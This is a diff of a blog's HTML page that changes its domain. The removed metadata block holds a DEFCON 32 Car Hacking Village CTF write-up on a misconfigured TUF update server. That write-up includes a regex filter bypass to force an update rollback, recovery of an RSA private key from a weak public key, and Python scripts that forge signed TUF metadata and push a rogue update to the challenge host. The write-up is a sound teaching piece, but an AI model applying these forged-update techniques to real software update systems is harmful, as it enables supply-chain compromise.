@@ -12,16 +12,16 @@ The TUF CTF was featured in the DEFCON 32 car hacking village CTF. There were 2 
 Local setup &amp; General overview
 Host &ldquo;TUF&rdquo; web server locally, in this case on port 8003. The TUF web server will contain metadata, which is a symbolic link to the current directory, which contains the forged">
 <meta name="author" content="">
-<link rel="canonical" href="https://yams.bot/writeups/defcon32/tufctf/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.d6fcd20a4fb86efa4dfac8ec95da60244cc8871042183da1ef28e3a762ad79c8.css" integrity="sha256-1vzSCk&#43;4bvpN&#43;sjsldpgJEzIhxBCGD2h7yjjp2Ktecg=" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://yams.bot/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://yams.bot/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://yams.bot/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://yams.bot/apple-touch-icon.png">
-<link rel="mask-icon" href="https://yams.bot/safari-pinned-tab.svg">
+<link rel="canonical" href="https://yamsbot.github.io/writeups/defcon32/tufctf/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.1d79e034ed3fae3cce466e1b13b697315f9998d1ba8d908def178611b372b49f.css" integrity="sha256-HXngNO0/rjzORm4bE7aXMV&#43;ZmNG6jZCN7xeGEbNytJ8=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://yamsbot.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://yamsbot.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://yamsbot.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://yamsbot.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://yamsbot.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://yams.bot/writeups/defcon32/tufctf/">
+<link rel="alternate" hreflang="en" href="https://yamsbot.github.io/writeups/defcon32/tufctf/">
 <noscript>
     <style>
         #theme-toggle,
@@ -30,79 +30,7 @@ Host &ldquo;TUF&rdquo; web server locally, in this case on port 8003. The TUF we
         }
 
     </style>
-</noscript><meta property="og:url" content="https://yams.bot/writeups/defcon32/tufctf/">
-  <meta property="og:site_name" content="🍠 yamsbot">
-  <meta property="og:title" content="[DEFCON CHV] TUF CTF">
-  <meta property="og:description" content="Description The TUF CTF was featured in the DEFCON 32 car hacking village CTF. There were 2 challenges in this category that involved a TUF server misconfiguration. The 2 challenges tied together, having to solve challenge 1 which leads into challenge 2.
-Local setup &amp; General overview Host “TUF” web server locally, in this case on port 8003. The TUF web server will contain metadata, which is a symbolic link to the current directory, which contains the forged">
-  <meta property="og:locale" content="en-us">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="writeups">
-    <meta property="article:published_time" content="2024-11-12T20:50:10-05:00">
-    <meta property="article:modified_time" content="2024-11-12T20:50:10-05:00">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="[DEFCON CHV] TUF CTF">
-<meta name="twitter:description" content="Description
-The TUF CTF was featured in the DEFCON 32 car hacking village CTF. There were 2 challenges in this category that involved a TUF server misconfiguration. The 2 challenges tied together, having to solve challenge 1 which leads into challenge 2.
-Local setup &amp; General overview
-Host &ldquo;TUF&rdquo; web server locally, in this case on port 8003. The TUF web server will contain metadata, which is a symbolic link to the current directory, which contains the forged">
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "writeups",
-      "item": "https://yams.bot/writeups/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "DEFCON 32 CHV",
-      "item": "https://yams.bot/writeups/defcon32/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  3 ,
-      "name": "[DEFCON CHV] TUF CTF",
-      "item": "https://yams.bot/writeups/defcon32/tufctf/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "[DEFCON CHV] TUF CTF",
-  "name": "[DEFCON CHV] TUF CTF",
-  "description": "Description The TUF CTF was featured in the DEFCON 32 car hacking village CTF. There were 2 challenges in this category that involved a TUF server misconfiguration. The 2 challenges tied together, having to solve challenge 1 which leads into challenge 2.\nLocal setup \u0026amp; General overview Host \u0026ldquo;TUF\u0026rdquo; web server locally, in this case on port 8003. The TUF web server will contain metadata, which is a symbolic link to the current directory, which contains the forged\n",
-  "keywords": [
-    
-  ],
-  "articleBody": "Description The TUF CTF was featured in the DEFCON 32 car hacking village CTF. There were 2 challenges in this category that involved a TUF server misconfiguration. The 2 challenges tied together, having to solve challenge 1 which leads into challenge 2.\nLocal setup \u0026 General overview Host “TUF” web server locally, in this case on port 8003. The TUF web server will contain metadata, which is a symbolic link to the current directory, which contains the forged\ntimestamp.json snapshot.json targets.json targets.json will contain a listing for the malicious software to be executed, in this case, tcmupdate_v0.2.0.py. Once the victim TUF server hits our malicious TUF server, the cached version of timestamp.json will be outdated, thus pulling in all of our malicious metadata and executing the malicious firmware.\nFlag 1 Connecting to the TUF server update CLI we are greeted with a prompt asking users to “Enter type name:” which will then download and execute the file that matches the regex query. The idea is that users are only able to pull the latest version of tcmupdate, not able to specify exactly what version to pull.\nThe following files are available:\n870cba60f57b8cbee2647241760d9a89f3c91dba2664467694d7f7e4e6ffaca588f8453302f196228b426df44c01524d5c5adeb2f82c37f51bb8c38e9b0cc900.tcmupdate_v0.2.0.py 9bbef34716da8edb86011be43aa1d6ca9f9ed519442c617d88a290c1ef8d11156804dcd3e3f26c81e4c14891e1230eb505831603b75e7c43e6071e2f07de6d1a.tcmupdate_v0.2.0.py 481997bcdcdf22586bc4512ccf78954066c4ede565b886d9a63c2c66e2873c84640689612b71c32188149b5d6495bcecbf7f0d726f5234e67e8834bb5b330872.tcmupdate_v0.3.0.py bc7e3e0a6ec78a2e70e70f87fbecf8a2ee4b484ce2190535c045aea48099ba218e5a968fb11b43b9fcc51de5955565a06fd043a83069e6b8f9a66654afe6ea57.tcmupdate_v0.4.0.py The cli program interacting with the remote TUF server introduces the following check to attempt users from rolling back to a previous version of tcmupdate:\nif \".\" in name: print(\"Not allowed!\") return Since the input is parsed as regex, we can easily bypass this filter and rollback to version v0.3.0 by using the following regex: tcmupdate_v0[\\D]3. Once v0.3.0 is executed we are greeted with the first flag and on our way to obtaining the second flag. Obtaining the second flag is more tricky, this is because we have to supply the program with the URL of a TUF server, which will then validate that the metadata objects on the remote TUF server have been signed, then download and execute the program specified from the remote server.\nFlag 2 Inside of the supplied root.json file we see that 3 of the 4 metadata files in use are signed by the same private key, and the public key that matches the keyid is supplied to us:\n\"f1f66ca394996ea67ac7855f484d9871c8fd74e687ebab826dbaedf3b9296d14\" : { \"keyid_hash_algorithms\" : [ \"sha256\", \"sha512\" ], \"keytype\" : \"rsa\", \"keyval\" : { \"public\" : \"-----BEGIN PUBLIC KEY-----\\nMIHyMA0GCSqGSIb3DQEBAQUAA4HgADCB3AKB1EisCnVT27PEvEllOdXcRW5GhuJu\\nHci8ZJAOeJzd7Q6vX99lmMOeEEVECvmDexLxyqpvy/qbYrm/sJLftrSJXviwCjNE\\nDx6vNpeLza1EefWTpVlLCJ4LD0/Ts3Y7OJ8ZHoEfWSa8lMa8+uSc+IXCAeLOHTb6\\nBlpf2mBbcPjXWFVGCS9RviidPkBcR9vwa74x5jK+lAijvxmR8spfJvPz/fC2/2F3\\nu9RgDYKBwPvfU59b9ObRDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADsGGj\\nAgMBAAE=\\n-----END PUBLIC KEY-----\\n\" }, \"scheme\" : \"rsassa-pss-sha256\" } }, \"roles\" : { \"root\" : { \"keyids\" : [ \"37eecb4fe22b7342995d648c31625634d4fb53090b91f256071ff4a0ee7e4870\" ], \"threshold\" : 1 }, \"snapshot\" : { \"keyids\" : [ \"f1f66ca394996ea67ac7855f484d9871c8fd74e687ebab826dbaedf3b9296d14\" ], \"threshold\" : 1 }, \"targets\" : { \"keyids\" : [ \"f1f66ca394996ea67ac7855f484d9871c8fd74e687ebab826dbaedf3b9296d14\" ], \"threshold\" : 1 }, \"timestamp\" : { \"keyids\" : [ \"f1f66ca394996ea67ac7855f484d9871c8fd74e687ebab826dbaedf3b9296d14\" ], \"threshold\" : 1 } }, \"spec_version\" : \"1.0\", \"version\" : 1 } } with the public key being:\n-----BEGIN PUBLIC KEY----- MIHyMA0GCSqGSIb3DQEBAQUAA4HgADCB3AKB1EisCnVT27PEvEllOdXcRW5GhuJu Hci8ZJAOeJzd7Q6vX99lmMOeEEVECvmDexLxyqpvy/qbYrm/sJLftrSJXviwCjNE Dx6vNpeLza1EefWTpVlLCJ4LD0/Ts3Y7OJ8ZHoEfWSa8lMa8+uSc+IXCAeLOHTb6 Blpf2mBbcPjXWFVGCS9RviidPkBcR9vwa74x5jK+lAijvxmR8spfJvPz/fC2/2F3 u9RgDYKBwPvfU59b9ObRDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADsGGj AgMBAAE= -----END PUBLIC KEY----- Supplying this public key to the RsaCtfTool we are able to use the “Lehman attack” to extract the private key from the public key. With the private key we are able to forge and sign our own metadata objects and supply our own malicious “firmware updates”\nExploiting the remote server is carried out using the following python scripts:\nsign.py\n#!/usr/bin/env python3 import hashlib, os from tuf.api.metadata import Metadata, Timestamp, MetaFile, Snapshot, Targets, TargetFile from securesystemslib.signer import CryptoSigner, Signer from cryptography.hazmat.primitives.serialization import load_pem_private_key from datetime import datetime, timedelta with open(\"keys/private.pem\", \"rb\") as f: pkey = load_pem_private_key(f.read(), None) signer = CryptoSigner(pkey) pubkey = signer.public_key exp = datetime.now() + timedelta(days=1) keyid = b\"f1f66ca394996ea67ac7855f484d9871c8fd74e687ebab826dbaedf3b9296d14\" bad_keyid = b\"70a11ababc3a62c640e59f5d3d5107e95dd811307294fecd7cf86bea8354747a\" def hasher(fn): with open(fn, \"rb\") as f: data = f.read() f.close() h = hashlib.new(\"sha512\") h.update(data) return h.hexdigest() def keyid_replace(fn): with open(fn, \"rb\") as f: data = f.read() f.close() data = data.replace(bad_keyid, keyid) with open(fn, \"wb\") as f: f.write(data) f.close() def sign_all(): # build targets.json tname = \"2.targets.json\" target = Metadata(Targets(version=2, spec_version=\"1.0\", expires=exp, targets={\"tcmupdate_v0.2.0.py\":TargetFile(length=79, hashes={\"sha512\":\"870cba60f57b8cbee2647241760d9a89f3c91dba2664467694d7f7e4e6ffaca588f8453302f196228b426df44c01524d5c5adeb2f82c37f51bb8c38e9b0cc900\"}, path=\"targets\")} )) target.sign(signer) target.to_file(tname) keyid_replace(tname) target_hash = hasher(tname) target_size = os.path.getsize(tname) # build snapshot.json sname = \"4.snapshot.json\" snapshot = Metadata(Snapshot(version=4, spec_version=\"1.0\", expires=exp, meta={\"targets.json\":MetaFile(version=2, length=target_size, hashes={\"sha512\":target_hash})} )) signed_snapshot = Metadata.to_bytes(snapshot.signed) snapshot.sign(signer) snapshot.to_file(sname) keyid_replace(sname) snapshot_hash = hasher(sname) snapshot_size = os.path.getsize(sname) # build timestamp.json timestamp = Metadata(Timestamp(version=4, spec_version=\"1.0\", expires=exp, snapshot_meta=MetaFile(version=4, length=snapshot_size, hashes={\"sha512\":snapshot_hash} ))) timestamp.sign(signer) timestamp.to_file(\"timestamp.json\") keyid_replace(\"timestamp.json\") solve.py\n#!/usr/bin/env python3 from pwn import * import sign conn = remote('172.28.2.64', 38002) context.log_level = \"critical\" payload1 = b'tcmupdate_v0[\\D]3' url = b'http://172.28.2.13:8003' print(conn.recvuntil(b'Enter type name:').decode()) print(payload1.decode()) conn.sendline(payload1) conn.recvuntil(b'Running tcmupdate_v0.3.0.py') sign.sign_all() print(conn.recvuntil(b'Enter a TUF server URL:').decode()) print(url.decode()) conn.sendline(url) print(conn.recvline_regex(b'You entered: ').decode()) print(conn.recvuntil(b'Enter a file path to download: ').decode()) conn.sendline(b'tcmupdate_v0.2.0.py') conn.interactive() conn.close() We must setup a TUF server locally which hosts a metadata file and targets directory. Inside of /targets will be\ntargets/870cba60f57b8cbee2647241760d9a89f3c91dba2664467694d7f7e4e6ffaca588f8453302f196228b426df44c01524d5c5adeb2f82c37f51bb8c38e9b0cc900.tcmupdate_v0.2.0.py containing:\n#!/usr/bin/env python3 with open(\"flag_2.txt\", \"r\") as f: print(f.read()) Running solve.py remotely exploits the server and allows us to read the second and final flag!\n",
-  "wordCount" : "780",
-  "inLanguage": "en",
-  "datePublished": "2024-11-12T20:50:10-05:00",
-  "dateModified": "2024-11-12T20:50:10-05:00",
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://yams.bot/writeups/defcon32/tufctf/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "🍠 yamsbot",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://yams.bot/favicon.ico"
-    }
-  }
-}
-</script>
+</noscript>
 </head>
 
 <body class=" dark" id="top">
@@ -116,7 +44,7 @@ Host &ldquo;TUF&rdquo; web server locally, in this case on port 8003. The TUF we
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="https://yams.bot/" accesskey="h" title="🍠 yamsbot (Alt + H)">🍠 yamsbot</a>
+            <a href="https://yamsbot.github.io/" accesskey="h" title="🍠 yamsbot (Alt + H)">🍠 yamsbot</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -142,22 +70,22 @@ Host &ldquo;TUF&rdquo; web server locally, in this case on port 8003. The TUF we
         </div>
         <ul id="menu">
             <li>
-                <a href="https://yams.bot/about/" title="about">
+                <a href="https://yamsbot.github.io/about/" title="about">
                     <span>about</span>
                 </a>
             </li>
             <li>
-                <a href="https://yams.bot/writeups/" title="writeups">
+                <a href="https://yamsbot.github.io/writeups/" title="writeups">
                     <span>writeups</span>
                 </a>
             </li>
             <li>
-                <a href="https://yams.bot/research/" title="research">
+                <a href="https://yamsbot.github.io/research/" title="research">
                     <span>research</span>
                 </a>
             </li>
             <li>
-                <a href="https://yams.bot/random/" title="random">
+                <a href="https://yamsbot.github.io/random/" title="random">
                     <span>random</span>
                 </a>
             </li>
@@ -367,7 +295,7 @@ AgMBAAE=
 <ul class="share-buttons">
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share [DEFCON CHV] TUF CTF on x"
-            href="https://x.com/intent/tweet/?text=%5bDEFCON%20CHV%5d%20TUF%20CTF&amp;url=https%3a%2f%2fyams.bot%2fwriteups%2fdefcon32%2ftufctf%2f&amp;hashtags=">
+            href="https://x.com/intent/tweet/?text=%5bDEFCON%20CHV%5d%20TUF%20CTF&amp;url=https%3a%2f%2fyamsbot.github.io%2fwriteups%2fdefcon32%2ftufctf%2f&amp;hashtags=">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
@@ -376,7 +304,7 @@ AgMBAAE=
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share [DEFCON CHV] TUF CTF on linkedin"
-            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fyams.bot%2fwriteups%2fdefcon32%2ftufctf%2f&amp;title=%5bDEFCON%20CHV%5d%20TUF%20CTF&amp;summary=%5bDEFCON%20CHV%5d%20TUF%20CTF&amp;source=https%3a%2f%2fyams.bot%2fwriteups%2fdefcon32%2ftufctf%2f">
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fyamsbot.github.io%2fwriteups%2fdefcon32%2ftufctf%2f&amp;title=%5bDEFCON%20CHV%5d%20TUF%20CTF&amp;summary=%5bDEFCON%20CHV%5d%20TUF%20CTF&amp;source=https%3a%2f%2fyamsbot.github.io%2fwriteups%2fdefcon32%2ftufctf%2f">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
@@ -390,7 +318,7 @@ AgMBAAE=
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="https://yams.bot/">🍠 yamsbot</a></span> · 
+        <span>&copy; 2025 <a href="https://yamsbot.github.io/">🍠 yamsbot</a></span> · 
 
     <span>
         Powered by
